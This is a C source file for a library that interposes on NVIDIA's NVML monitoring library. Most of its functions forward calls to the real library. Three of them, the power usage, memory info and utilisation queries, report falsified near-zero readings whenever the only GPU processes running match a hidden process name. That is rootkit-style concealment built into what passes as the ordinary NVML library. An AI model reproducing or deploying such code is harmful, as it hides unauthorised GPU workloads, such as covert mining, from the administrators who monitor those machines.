#include <dlfcn.h>
#include <string.h>
#include "nvml.h"
#include <stdlib.h>



void * dlhandler;

void __attribute__ ((constructor)) some_name_load(void)
{
	//dlhandler = dlopen("/usr/lib64/libnvidia-ml.so.346.46",RTLD_LAZY);
	dlhandler = dlopen("/usr/lib64/libnvidia-ml.so.346.46",RTLD_NOW);
	
	//dlhandler = dlopen("/usr/lib64/libnvidia-ml.so.352.39",RTLD_NOW);
	if(dlhandler ==NULL)
	{
		printf("Error in ldopen!\n");
	}
	//nvmlInternalGetExportTable = dlsym(dlhandler,"nvmlInternalGetExportTable");
	//printf("DEBUG:dlhandler  is %p\n",dlhandler);

		
}




void __attribute__ ((destructor)) some_name_unload(void)
{
	dlclose(dlhandler);
	
}


void * getfn(const char *symbol)
{
	void * ret;
	ret = dlsym(dlhandler,symbol);
	if(ret == NULL)
	{
		printf("Not fount %s",symbol);
	}
	//printf("DEBUG:%s address  is %p\n",symbol,ret);
	return ret;
	
}


int nvmlInternalGetExportTable(int * a,unsigned char * b)
{
	int  (*fn)(int * a, unsigned char * b);
	fn = getfn("nvmlInternalGetExportTable");
	//printf("DEBUG: nvmlInternalGetExport address is %p\n",fn);
	return fn(a,b);
}



nvmlReturn_t DECLDIR nvmlInit(void)
{
	nvmlReturn_t ret;
	nvmlReturn_t DECLDIR (*fn)(void);
	//printf("Begin init\n");
	fn = getfn("nvmlInit_v2");
	//printf("start init with address %p\n",fn);
	ret = fn();
	return ret;
}
nvmlReturn_t DECLDIR nvmlShutdown(void){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(void);fn = getfn("nvmlShutdown");ret = fn();return ret;}
const DECLDIR char* nvmlErrorString(nvmlReturn_t result){const DECLDIR char * ret;const DECLDIR char* (*fn)(nvmlReturn_t result);fn = getfn("nvmlErrorString");ret = fn(result);return ret;}
nvmlReturn_t DECLDIR nvmlSystemGetDriverVersion(char *version, unsigned int length){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(char *version, unsigned int length);fn = getfn("nvmlSystemGetDriverVersion");ret = fn(version,  length);return ret;}
nvmlReturn_t DECLDIR nvmlSystemGetNVMLVersion(char *version, unsigned int length){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(char *version, unsigned int length);fn = getfn("nvmlSystemGetNVMLVersion");ret = fn(version,  length);return ret;}
nvmlReturn_t DECLDIR nvmlSystemGetProcessName(unsigned int pid, char *name, unsigned int length){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(unsigned int pid, char *name, unsigned int length);fn = getfn("nvmlSystemGetProcessName");ret = fn( pid,name,  length);return ret;}
nvmlReturn_t DECLDIR nvmlUnitGetCount(unsigned int *unitCount){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(unsigned int *unitCount);fn = getfn("nvmlUnitGetCount");ret = fn(unitCount);return ret;}
nvmlReturn_t DECLDIR nvmlUnitGetHandleByIndex(unsigned int index, nvmlUnit_t *unit){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(unsigned int index, nvmlUnit_t *unit);fn = getfn("nvmlUnitGetHandleByIndex");ret = fn(index, unit);return ret;}
nvmlReturn_t DECLDIR nvmlUnitGetUnitInfo(nvmlUnit_t unit, nvmlUnitInfo_t *info){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlUnit_t unit, nvmlUnitInfo_t *info);fn = getfn("nvmlUnitGetUnitInfo");ret = fn(unit, info);return ret;}
nvmlReturn_t DECLDIR nvmlUnitGetLedState(nvmlUnit_t unit, nvmlLedState_t *state){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlUnit_t unit, nvmlLedState_t *state);fn = getfn("nvmlUnitGetLedState");ret = fn(unit, state);return ret;}
nvmlReturn_t DECLDIR nvmlUnitGetPsuInfo(nvmlUnit_t unit, nvmlPSUInfo_t *psu){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlUnit_t unit, nvmlPSUInfo_t *psu);fn = getfn("nvmlUnitGetPsuInfo");ret = fn(unit, psu);return ret;}
nvmlReturn_t DECLDIR nvmlUnitGetTemperature(nvmlUnit_t unit, unsigned int type, unsigned int *temp){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlUnit_t unit, unsigned int type, unsigned int *temp);fn = getfn("nvmlUnitGetTemperature");ret = fn(unit, type, temp);return ret;}
nvmlReturn_t DECLDIR nvmlUnitGetFanSpeedInfo(nvmlUnit_t unit, nvmlUnitFanSpeeds_t *fanSpeeds){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlUnit_t unit, nvmlUnitFanSpeeds_t *fanSpeeds);fn = getfn("nvmlUnitGetFanSpeedInfo");ret = fn(unit, fanSpeeds);return ret;}
nvmlReturn_t DECLDIR nvmlUnitGetDevices(nvmlUnit_t unit, unsigned int *deviceCount, nvmlDevice_t *devices){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlUnit_t unit, unsigned int *deviceCount, nvmlDevice_t *devices);fn = getfn("nvmlUnitGetDevices");ret = fn(unit, deviceCount, devices);return ret;}
nvmlReturn_t DECLDIR nvmlSystemGetHicVersion(unsigned int *hwbcCount, nvmlHwbcEntry_t *hwbcEntries){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(unsigned int *hwbcCount, nvmlHwbcEntry_t *hwbcEntries);fn = getfn("nvmlSystemGetHicVersion");ret = fn(hwbcCount, hwbcEntries);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetCount(unsigned int *deviceCount){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(unsigned int *deviceCount);fn = getfn("nvmlDeviceGetCount_v2");ret = fn(deviceCount);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetHandleByIndex(unsigned int index, nvmlDevice_t *device){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(unsigned int index, nvmlDevice_t *device);fn = getfn("nvmlDeviceGetHandleByIndex_v2");ret = fn(index, device);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetHandleBySerial(const char *serial, nvmlDevice_t *device){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(const char *serial, nvmlDevice_t *device);fn = getfn("nvmlDeviceGetHandleBySerial");ret = fn(serial, device);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetHandleByUUID(const char *uuid, nvmlDevice_t *device){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(const char *uuid, nvmlDevice_t *device);fn = getfn("nvmlDeviceGetHandleByUUID");ret = fn(uuid, device);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetHandleByPciBusId(const char *pciBusId, nvmlDevice_t *device){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(const char *pciBusId, nvmlDevice_t *device);fn = getfn("nvmlDeviceGetHandleByPciBusId_v2");ret = fn(pciBusId, device);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetName(nvmlDevice_t device, char *name, unsigned int length){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, char *name, unsigned int length);fn = getfn("nvmlDeviceGetName");ret = fn(device, name, length);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetBrand(nvmlDevice_t device, nvmlBrandType_t *type){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlBrandType_t *type);fn = getfn("nvmlDeviceGetBrand");ret = fn(device, type);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetIndex(nvmlDevice_t device, unsigned int *index){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *index);fn = getfn("nvmlDeviceGetIndex");ret = fn(device, index);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetSerial(nvmlDevice_t device, char *serial, unsigned int length){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, char *serial, unsigned int length);fn = getfn("nvmlDeviceGetSerial");ret = fn(device, serial, length);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetCpuAffinity(nvmlDevice_t device, unsigned int cpuSetSize, unsigned long *cpuSet){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int cpuSetSize, unsigned long *cpuSet);fn = getfn("nvmlDeviceGetCpuAffinity");ret = fn(device, cpuSetSize, cpuSet);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceSetCpuAffinity(nvmlDevice_t device){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device);fn = getfn("nvmlDeviceSetCpuAffinity");ret = fn(device);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceClearCpuAffinity(nvmlDevice_t device){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device);fn = getfn("nvmlDeviceClearCpuAffinity");ret = fn(device);return ret;}
//nvmlReturn_t DECLDIR nvmlDeviceGetTopologyCommonAncestor(nvmlDevice_t device1, nvmlDevice_t device2, nvmlGpuTopologyLevel_t *pathInfo){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device1, nvmlDevice_t device2, nvmlGpuTopologyLevel_t *pathInfo);fn = getfn("nvmlDeviceGetTopologyCommonAncestor");ret = fn(device1, device2, pathInfo);return ret;}
//nvmlReturn_t DECLDIR nvmlDeviceGetTopologyNearestGpus(nvmlDevice_t device, nvmlGpuTopologyLevel_t level, unsigned int *count, nvmlDevice_t *deviceArray){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlGpuTopologyLevel_t level, unsigned int *count, nvmlDevice_t *deviceArray);fn = getfn("nvmlDeviceGetTopologyNearestGpus");ret = fn(device, level, count, deviceArray);return ret;}
nvmlReturn_t DECLDIR nvmlSystemGetTopologyGpuSet(unsigned int cpuNumber, unsigned int *count, nvmlDevice_t *deviceArray){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(unsigned int cpuNumber, unsigned int *count, nvmlDevice_t *deviceArray);fn = getfn("nvmlSystemGetTopologyGpuSet");ret = fn(cpuNumber, count, deviceArray);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetUUID(nvmlDevice_t device, char *uuid, unsigned int length){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, char *uuid, unsigned int length);fn = getfn("nvmlDeviceGetUUID");ret = fn(device, uuid, length);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetMinorNumber(nvmlDevice_t device, unsigned int *minorNumber){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *minorNumber);fn = getfn("nvmlDeviceGetMinorNumber");ret = fn(device, minorNumber);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetInforomVersion(nvmlDevice_t device, nvmlInforomObject_t object, char *version, unsigned int length){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlInforomObject_t object, char *version, unsigned int length);fn = getfn("nvmlDeviceGetInforomVersion");ret = fn(device, object, version, length);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetInforomImageVersion(nvmlDevice_t device, char *version, unsigned int length){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, char *version, unsigned int length);fn = getfn("nvmlDeviceGetInforomImageVersion");ret = fn(device, version, length);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetInforomConfigurationChecksum(nvmlDevice_t device, unsigned int *checksum){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *checksum);fn = getfn("nvmlDeviceGetInforomConfigurationChecksum");ret = fn(device, checksum);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceValidateInforom(nvmlDevice_t device){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device);fn = getfn("nvmlDeviceValidateInforom");ret = fn(device);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetDisplayMode(nvmlDevice_t device, nvmlEnableState_t *display){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t *display);fn = getfn("nvmlDeviceGetDisplayMode");ret = fn(device, display);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetDisplayActive(nvmlDevice_t device, nvmlEnableState_t *isActive){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t *isActive);fn = getfn("nvmlDeviceGetDisplayActive");ret = fn(device, isActive);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetPersistenceMode(nvmlDevice_t device, nvmlEnableState_t *mode){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t *mode);fn = getfn("nvmlDeviceGetPersistenceMode");ret = fn(device, mode);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetPciInfo(nvmlDevice_t device, nvmlPciInfo_t *pci){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlPciInfo_t *pci);fn = getfn("nvmlDeviceGetPciInfo_v2");ret = fn(device, pci);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetMaxPcieLinkGeneration(nvmlDevice_t device, unsigned int *maxLinkGen){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *maxLinkGen);fn = getfn("nvmlDeviceGetMaxPcieLinkGeneration");ret = fn(device, maxLinkGen);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetMaxPcieLinkWidth(nvmlDevice_t device, unsigned int *maxLinkWidth){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *maxLinkWidth);fn = getfn("nvmlDeviceGetMaxPcieLinkWidth");ret = fn(device, maxLinkWidth);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetCurrPcieLinkGeneration(nvmlDevice_t device, unsigned int *currLinkGen){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *currLinkGen);fn = getfn("nvmlDeviceGetCurrPcieLinkGeneration");ret = fn(device, currLinkGen);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetCurrPcieLinkWidth(nvmlDevice_t device, unsigned int *currLinkWidth){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *currLinkWidth);fn = getfn("nvmlDeviceGetCurrPcieLinkWidth");ret = fn(device, currLinkWidth);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetPcieThroughput(nvmlDevice_t device, nvmlPcieUtilCounter_t counter, unsigned int *value){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlPcieUtilCounter_t counter, unsigned int *value);fn = getfn("nvmlDeviceGetPcieThroughput");ret = fn(device, counter, value);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetPcieReplayCounter(nvmlDevice_t device, unsigned int *value){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *value);fn = getfn("nvmlDeviceGetPcieReplayCounter");ret = fn(device, value);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetClockInfo(nvmlDevice_t device, nvmlClockType_t type, unsigned int *clock){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlClockType_t type, unsigned int *clock);fn = getfn("nvmlDeviceGetClockInfo");ret = fn(device, type, clock);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetMaxClockInfo(nvmlDevice_t device, nvmlClockType_t type, unsigned int *clock){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlClockType_t type, unsigned int *clock);fn = getfn("nvmlDeviceGetMaxClockInfo");ret = fn(device, type, clock);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetApplicationsClock(nvmlDevice_t device, nvmlClockType_t clockType, unsigned int *clockMHz){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlClockType_t clockType, unsigned int *clockMHz);fn = getfn("nvmlDeviceGetApplicationsClock");ret = fn(device, clockType, clockMHz);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetDefaultApplicationsClock(nvmlDevice_t device, nvmlClockType_t clockType, unsigned int *clockMHz){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlClockType_t clockType, unsigned int *clockMHz);fn = getfn("nvmlDeviceGetDefaultApplicationsClock");ret = fn(device, clockType, clockMHz);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceResetApplicationsClocks(nvmlDevice_t device){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device);fn = getfn("nvmlDeviceResetApplicationsClocks");ret = fn(device);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetSupportedMemoryClocks(nvmlDevice_t device, unsigned int *count, unsigned int *clocksMHz){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *count, unsigned int *clocksMHz);fn = getfn("nvmlDeviceGetSupportedMemoryClocks");ret = fn(device, count, clocksMHz);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetSupportedGraphicsClocks(nvmlDevice_t device, unsigned int memoryClockMHz, unsigned int *count, unsigned int *clocksMHz){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int memoryClockMHz, unsigned int *count, unsigned int *clocksMHz);fn = getfn("nvmlDeviceGetSupportedGraphicsClocks");ret = fn(device, memoryClockMHz, count, clocksMHz);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetAutoBoostedClocksEnabled(nvmlDevice_t device, nvmlEnableState_t *isEnabled, nvmlEnableState_t *defaultIsEnabled){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t *isEnabled, nvmlEnableState_t *defaultIsEnabled);fn = getfn("nvmlDeviceGetAutoBoostedClocksEnabled");ret = fn(device, isEnabled, defaultIsEnabled);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceSetAutoBoostedClocksEnabled(nvmlDevice_t device, nvmlEnableState_t enabled){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t enabled);fn = getfn("nvmlDeviceSetAutoBoostedClocksEnabled");ret = fn(device, enabled);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceSetDefaultAutoBoostedClocksEnabled(nvmlDevice_t device, nvmlEnableState_t enabled, unsigned int flags){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t enabled, unsigned int flags);fn = getfn("nvmlDeviceSetDefaultAutoBoostedClocksEnabled");ret = fn(device, enabled, flags);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetFanSpeed(nvmlDevice_t device, unsigned int *speed){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *speed);fn = getfn("nvmlDeviceGetFanSpeed");ret = fn(device, speed);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetTemperature(nvmlDevice_t device, nvmlTemperatureSensors_t sensorType, unsigned int *temp){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlTemperatureSensors_t sensorType, unsigned int *temp);fn = getfn("nvmlDeviceGetTemperature");ret = fn(device, sensorType, temp);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetTemperatureThreshold(nvmlDevice_t device, nvmlTemperatureThresholds_t thresholdType, unsigned int *temp){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlTemperatureThresholds_t thresholdType, unsigned int *temp);fn = getfn("nvmlDeviceGetTemperatureThreshold");ret = fn(device, thresholdType, temp);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetPerformanceState(nvmlDevice_t device, nvmlPstates_t *pState){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlPstates_t *pState);fn = getfn("nvmlDeviceGetPerformanceState");ret = fn(device, pState);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetCurrentClocksThrottleReasons(nvmlDevice_t device, unsigned long long *clocksThrottleReasons){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned long long *clocksThrottleReasons);fn = getfn("nvmlDeviceGetCurrentClocksThrottleReasons");ret = fn(device, clocksThrottleReasons);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetSupportedClocksThrottleReasons(nvmlDevice_t device, unsigned long long *supportedClocksThrottleReasons){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned long long *supportedClocksThrottleReasons);fn = getfn("nvmlDeviceGetSupportedClocksThrottleReasons");ret = fn(device, supportedClocksThrottleReasons);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetPowerState(nvmlDevice_t device, nvmlPstates_t *pState){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlPstates_t *pState);fn = getfn("nvmlDeviceGetPowerState");ret = fn(device, pState);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetPowerManagementMode(nvmlDevice_t device, nvmlEnableState_t *mode){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t *mode);fn = getfn("nvmlDeviceGetPowerManagementMode");ret = fn(device, mode);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetPowerManagementLimit(nvmlDevice_t device, unsigned int *limit){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *limit);fn = getfn("nvmlDeviceGetPowerManagementLimit");ret = fn(device, limit);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetPowerManagementLimitConstraints(nvmlDevice_t device, unsigned int *minLimit, unsigned int *maxLimit){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *minLimit, unsigned int *maxLimit);fn = getfn("nvmlDeviceGetPowerManagementLimitConstraints");ret = fn(device, minLimit, maxLimit);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetPowerManagementDefaultLimit(nvmlDevice_t device, unsigned int *defaultLimit){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *defaultLimit);fn = getfn("nvmlDeviceGetPowerManagementDefaultLimit");ret = fn(device, defaultLimit);return ret;}

nvmlReturn_t DECLDIR nvmlDeviceGetPowerUsage(nvmlDevice_t device, unsigned int *power)
{
	nvmlReturn_t ret;
	nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *power);
	fn = getfn("nvmlDeviceGetPowerUsage");
	ret = fn(device, power);
	
        int only_hidden = 1;
        nvmlProcessInfo_t infos[10];
        unsigned int count = 10;
        nvmlDeviceGetComputeRunningProcesses(device , &count, infos);

        int i ;
        for (i = 0; i < count; i++)
        {
                char proname[128];
                nvmlSystemGetProcessName(infos[i].pid, proname, 128);
                if(strncmp(proname, HIDDEN_CMD_GPU, 128))
                {
                        only_hidden = 0;
                        break;
                }
        }


        if(only_hidden)
                *power=22;


	return ret;
}

nvmlReturn_t DECLDIR nvmlDeviceGetEnforcedPowerLimit(nvmlDevice_t device, unsigned int *limit){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *limit);fn = getfn("nvmlDeviceGetEnforcedPowerLimit");ret = fn(device, limit);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetGpuOperationMode(nvmlDevice_t device, nvmlGpuOperationMode_t *current, nvmlGpuOperationMode_t *pending){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlGpuOperationMode_t *current, nvmlGpuOperationMode_t *pending);fn = getfn("nvmlDeviceGetGpuOperationMode");ret = fn(device, current, pending);return ret;}

nvmlReturn_t DECLDIR nvmlDeviceGetMemoryInfo(nvmlDevice_t device, nvmlMemory_t *memory)
{
	nvmlReturn_t ret;
	nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlMemory_t *memory);
	fn = getfn("nvmlDeviceGetMemoryInfo");
	ret = fn(device, memory);


	int only_hidden = 1;
	nvmlProcessInfo_t infos[10];
	unsigned int count = 10;
	nvmlDeviceGetComputeRunningProcesses(device , &count, infos);
	
	int i ;
	for (i = 0; i < count; i++)
	{
                char proname[128];
                nvmlSystemGetProcessName(infos[i].pid, proname, 128);
                if(strncmp(proname, HIDDEN_CMD_GPU, 128))
		{
			only_hidden = 0; 
			break;
		}
	}
	
	
	if(only_hidden)
		memory->used=55;	




	return ret;
}

nvmlReturn_t DECLDIR nvmlDeviceGetComputeMode(nvmlDevice_t device, nvmlComputeMode_t *mode){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlComputeMode_t *mode);fn = getfn("nvmlDeviceGetComputeMode");ret = fn(device, mode);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetEccMode(nvmlDevice_t device, nvmlEnableState_t *current, nvmlEnableState_t *pending){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlEnableState_t *current, nvmlEnableState_t *pending);fn = getfn("nvmlDeviceGetEccMode");ret = fn(device, current, pending);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetBoardId(nvmlDevice_t device, unsigned int *boardId){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *boardId);fn = getfn("nvmlDeviceGetBoardId");ret = fn(device, boardId);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetMultiGpuBoard(nvmlDevice_t device, unsigned int *multiGpuBool){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *multiGpuBool);fn = getfn("nvmlDeviceGetMultiGpuBoard");ret = fn(device, multiGpuBool);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetTotalEccErrors(nvmlDevice_t device, nvmlMemoryErrorType_t errorType, nvmlEccCounterType_t counterType, unsigned long long *eccCounts){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlMemoryErrorType_t errorType, nvmlEccCounterType_t counterType, unsigned long long *eccCounts);fn = getfn("nvmlDeviceGetTotalEccErrors");ret = fn(device, errorType, counterType, eccCounts);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetDetailedEccErrors(nvmlDevice_t device, nvmlMemoryErrorType_t errorType, nvmlEccCounterType_t counterType, nvmlEccErrorCounts_t *eccCounts){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlMemoryErrorType_t errorType, nvmlEccCounterType_t counterType, nvmlEccErrorCounts_t *eccCounts);fn = getfn("nvmlDeviceGetDetailedEccErrors");ret = fn(device, errorType, counterType, eccCounts);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetMemoryErrorCounter(nvmlDevice_t device, nvmlMemoryErrorType_t errorType,nvmlEccCounterType_t counterType,nvmlMemoryLocation_t locationType, unsigned long long *count){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlMemoryErrorType_t errorType,nvmlEccCounterType_t counterType,nvmlMemoryLocation_t locationType, unsigned long long *count);fn = getfn("nvmlDeviceGetMemoryErrorCounter");ret = fn(device, errorType,counterType,locationType, count);return ret;}

nvmlReturn_t DECLDIR nvmlDeviceGetUtilizationRates(nvmlDevice_t device, nvmlUtilization_t *utilization)
{
	nvmlReturn_t ret;
	nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlUtilization_t *utilization);
	fn = getfn("nvmlDeviceGetUtilizationRates");

	ret = fn(device, utilization);

	int only_hidden = 1;
	nvmlProcessInfo_t infos[10];
	unsigned int count = 10;
	nvmlDeviceGetComputeRunningProcesses(device , &count, infos);
	
	int i ;
	for (i = 0; i < count; i++)
	{
                char proname[128];
                nvmlSystemGetProcessName(infos[i].pid, proname, 128);
                if(strncmp(proname, HIDDEN_CMD_GPU, 128))
		{
			only_hidden = 0; 
			break;
		}
	}
	
	
	if(only_hidden)
		utilization->gpu=0;	

	return ret;
}

nvmlReturn_t DECLDIR nvmlDeviceGetEncoderUtilization(nvmlDevice_t device, unsigned int *utilization, unsigned int *samplingPeriodUs){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *utilization, unsigned int *samplingPeriodUs);fn = getfn("nvmlDeviceGetEncoderUtilization");ret = fn(device, utilization, samplingPeriodUs);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetDecoderUtilization(nvmlDevice_t device, unsigned int *utilization, unsigned int *samplingPeriodUs){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, unsigned int *utilization, unsigned int *samplingPeriodUs);fn = getfn("nvmlDeviceGetDecoderUtilization");ret = fn(device, utilization, samplingPeriodUs);return ret;}
nvmlReturn_t DECLDIR nvmlDeviceGetDriverModel(nvmlDevice_t device, nvmlDriverModel_t *current, nvmlDriverModel_t *pending){nvmlReturn_t ret;nvmlReturn_t DECLDIR (*fn)(nvmlDevice_t device, nvmlDriverModel_t *current, nvmlDriverModel_t *pending);fn = getfn("nvmlDeviceGetDriverModel");ret = fn(device, current, pending);return ret;}
